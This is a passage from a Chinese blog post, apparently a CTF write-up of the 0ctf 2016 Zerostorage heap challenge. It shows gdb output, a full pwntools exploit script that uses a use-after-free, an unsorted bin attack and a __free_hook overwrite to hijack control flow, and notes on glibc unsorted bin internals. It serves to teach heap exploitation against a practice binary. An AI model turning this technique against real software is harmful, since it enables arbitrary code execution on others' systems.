[0x0000555555758130     4f 47 fc f7 ff 7f 00 00 0a 47 47 47 47 47 47 47    OG.......GGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758330, size=0x20ce0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">gef➤  x/gx 0x7ffff7fc2b20 + 8 + 30 * 8</span><br><span class="line">0x7ffff7fc2c18: 0x0000555555758120</span><br><span class="line">gef➤  x/gx 0x0000555555758120</span><br><span class="line">0x555555758120: 0x0000000000000000</span><br><span class="line">gef➤  x/gx 0x0000555555758120 + 8</span><br><span class="line">0x555555758128: 0x0000000000000201</span><br><span class="line">gef➤  x/gx 0x0000555555758120 + 8 +8</span><br><span class="line">0x555555758130: 0x00007ffff7fc474f</span><br><span class="line"></span><br><span class="line">malloc_free_hook_target_addr的地址就是0x00007ffff7fc474f</span><br></pre></td></tr></table></figure>
<p>我们已经成功修改了fd指针指向了我们想要的区域。<br>下面需要进行两次分配0x200 chunk。</p>
<p>第一次分配弹出无用的fastbin，第二次分配得到对free_hook的内存的指针。<br>之后就是往里面写数据，写数据的时候还有一个坑，就是要写入\x00字符，否则printf无法返回，程序会卡在那里。<br>原因是free_hook附近的数据显然是有用的，如果我们修改了就有可能导致程序出问题。</p>
<p>之后就是调用free实现对free_hook的劫持。至此我们已经拿到了PC的控制权，PWN！</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这道题的难度可谓非常大，在调试过程中出现了太多的问题，本文也是边调试编写，可能前半部分有问题，但是我都记录下来了，不可能我们一蹴而就的直接给出最优解，正确的答案是简练的但是却缺少了很多思维过程，这是我在做这道题搜寻资料的时候发现大家都是拿着别人写好的exp跑一遍就行了，但是exp能看懂，不代表你解理解了真正的解题思路，希望本篇这种完整的解题记录能给大家一点启发。</p>
<h3 id="我的利用代码"><a href="#我的利用代码" class="headerlink" title="我的利用代码"></a>我的利用代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">target = process(&quot;./zerostorage_long&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;./zerostorage_long&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"># gdb.attach(target)</span><br><span class="line"># recv_str = target.recv()</span><br><span class="line"># print recv_str</span><br><span class="line"></span><br><span class="line">raw_input(&quot;Begin...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def insert(size, data):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;1&quot;)</span><br><span class="line">    target.recvuntil(&quot;Length of new entry: &quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;Enter your data: &quot;)</span><br><span class="line">    target.sendline(data)</span><br><span class="line"></span><br><span class="line">def merge(index1, index2):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;3&quot;)</span><br><span class="line">    target.recvuntil(&quot;Merge from Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index1))</span><br><span class="line">    target.recvuntil(&quot;Merge to Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index2))</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;5&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvline()</span><br><span class="line">    ret = target.recvline()</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def edit(index, size, data):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;2&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;Length of entry: &quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;Enter your data: &quot;)</span><br><span class="line">    target.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;4&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def system_input(cmd):</span><br><span class="line">    target.sendline(cmd)</span><br><span class="line"></span><br><span class="line"># Create two chunks, must prevent consolidate into forest</span><br><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1</span><br><span class="line"></span><br><span class="line">length = 0x100 - 0x8</span><br><span class="line">insert(length,&quot;G&quot;*(length-1))    # 2</span><br><span class="line"></span><br><span class="line"># Merge 0 chunk with itself, use after free</span><br><span class="line">merge(0, 0)               # 把0 放到了unsorted bin上了，同时也可以访问0, ## 3</span><br><span class="line"># print(target.recv())</span><br><span class="line">leak_main_arena_88 = u64(view(3)[0:8])</span><br><span class="line"></span><br><span class="line"># 0x3c3b20 + 88 main_arena_88 offset   0x7ffff7fc2b78</span><br><span class="line"># 0x3c5848   max_fast_addr offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 0x7ffff7fc2b20是arena的地址</span><br><span class="line"># fast bin的地址0x7ffff7fc2b20 +8</span><br><span class="line"># fast bin 0x200对应的内存地址0x7ffff7fc2b20 + 8 + 30 * 8</span><br><span class="line">offset1 = 0x1cd0</span><br><span class="line">max_fast_addr = leak_main_arena_88 + offset1</span><br><span class="line"></span><br><span class="line">edit(3,0x10,p64(leak_main_arena_88) + p64(max_fast_addr- 2*8))</span><br><span class="line"></span><br><span class="line">insert(0x20,&quot;C&quot;*0x1f)    # 0</span><br><span class="line"></span><br><span class="line"># print(target.recv())</span><br><span class="line"></span><br><span class="line">merge(2,2)              # 4</span><br><span class="line"></span><br><span class="line"># print(target.recv())</span><br><span class="line"></span><br><span class="line">malloc_free_hook_target_addr = 0x1bdf + leak_main_arena_88 - 8</span><br><span class="line">edit(4, 0x1f0, p64(malloc_free_hook_target_addr) + (0x1f0-8-1)*&#x27;I&#x27;)  </span><br><span class="line"></span><br><span class="line">offset2 = 0x1c30</span><br><span class="line">free_hook_addr = leak_main_arena_88 + offset2</span><br><span class="line">num_to_write = (free_hook_addr - (malloc_free_hook_target_addr + 2 * 8 ))</span><br><span class="line"></span><br><span class="line">execve_bin_sh_addr = leak_main_arena_88 - 0x37e917</span><br><span class="line"></span><br><span class="line">insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"># insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"></span><br><span class="line"># insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"></span><br><span class="line">insert(0x1f0,num_to_write * &#x27;\x00&#x27; + p64(execve_bin_sh_addr) + &#x27;\x00&#x27; * (0x1f0-num_to_write-8-1))   # 6</span><br><span class="line"># insert(0x1f0,num_to_write * &#x27;E&#x27; + p64(execve_bin_sh_addr))   # 6</span><br><span class="line"></span><br><span class="line"># insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line"># print(&#x27;haha&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">system_input(&#x27;ls&#x27;)</span><br><span class="line">print(target.recv())</span><br></pre></td></tr></table></figure>

<p>最后虽然成功跳转了pc，但是没有执行execve(‘/bin/sh’)成功，具体原因不想再研究了，希望同学可以指点下。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a target="_blank" rel="noopener" href="https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html">https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html</a></li>
<li><a target="_blank" rel="noopener" href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/">http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/</a></li>
<li><a target="_blank" rel="noopener" href="https://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/">https://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/</a></li>
</ol>
<h3 id="libc-unsorted-bin的出入顺序"><a href="#libc-unsorted-bin的出入顺序" class="headerlink" title="libc unsorted bin的出入顺序"></a>libc unsorted bin的出入顺序</h3><ol>
<li><p>分析源码发现，当free的时候，往unsorted bin中添加chunk，会将unsorted bin -&gt;fd 指向这个新加入的chunk，然后这个chunk的bk指向unsorted bin，这个chunk的fd指向原来的unsorted bin -&gt;fd, 并且让原来的unsorted bin-&gt;fd的bk指向这个新的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = &quot;free(): corrupted unsorted chunks&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;    //p是新chunk，新chunk的fd指向本来的头部</span><br><span class="line">     p-&gt;bk = bck;    //新chunk的bk指向unsorted bin</span><br><span class="line">     if (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = NULL;</span><br><span class="line">  p-&gt;bk_nextsize = NULL;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;   // unsorted-&gt;fd指向新chunk</span><br><span class="line">     fwd-&gt;bk = p;   // 原来的头部的bk指向新chunk</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>当从unsorted bin中取元素出来的时候是先取的unsorted bin -&gt;bk指向的元素，取元素会重写两个指针。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk)  //取出的元素的unsorted bin的bk</span><br><span class="line">...</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;   // unsorted bin-&gt;bk指向被取出的元素的上一个元素</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);   // 被取出元素的上一个元素的fd指向unsorted bin</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="malloc-函数的基本逻辑"><a href="#malloc-函数的基本逻辑" class="headerlink" title="malloc 函数的基本逻辑"></a>malloc 函数的基本逻辑</h3><p><img src="pastimages/2021-06-02-11-55-10.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack%E4%BE%8B%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">unsorted bin attack例程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0ctf-2016-Zerostorage"><span class="toc-number">3.</span> <span class="toc-text">0ctf 2016 - Zerostorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95"><span class="toc-number">6.</span> <span class="toc-text">关键步骤调试记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9Aglobal-max-fast%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">6.1.</span> <span class="toc-text">如何确定global_max_fast的地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin-attack%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">unsorted bin attack的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84fastbin-chunk%E5%A4%A7%E5%B0%8F"><span class="toc-number">7.</span> <span class="toc-text">选择合适的fastbin chunk大小</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">8.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc-realloc%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text">__libc_realloc函数的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">9.1.</span> <span class="toc-text">两个特殊情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%83%85%E5%86%B5"><span class="toc-number">9.2.</span> <span class="toc-text">一般情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87realloc%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA0x200%E5%A4%A7%E5%B0%8F%E7%9A%84chunk"><span class="toc-number">10.</span> <span class="toc-text">通过realloc得到一个0x200大小的chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0free-hook%E5%86%85%E5%AD%98%E9%99%84%E8%BF%91%E7%9A%84%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">拿到free_hook内存附近的控制权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">12.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">13.</span> <span class="toc-text">我的利用代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">14.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc-unsorted-bin%E7%9A%84%E5%87%BA%E5%85%A5%E9%A1%BA%E5%BA%8F"><span class="toc-number">15.</span> <span class="toc-text">libc unsorted bin的出入顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91"><span class="toc-number">16.</span> <span class="toc-text">malloc 函数的基本逻辑</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&text=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&is_video=false&description=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=堆利用系列五：Unsorted Bin Attack &body=Check out this article: https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&name=堆利用系列五：Unsorted Bin Attack &description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&t=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    Colorlight
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
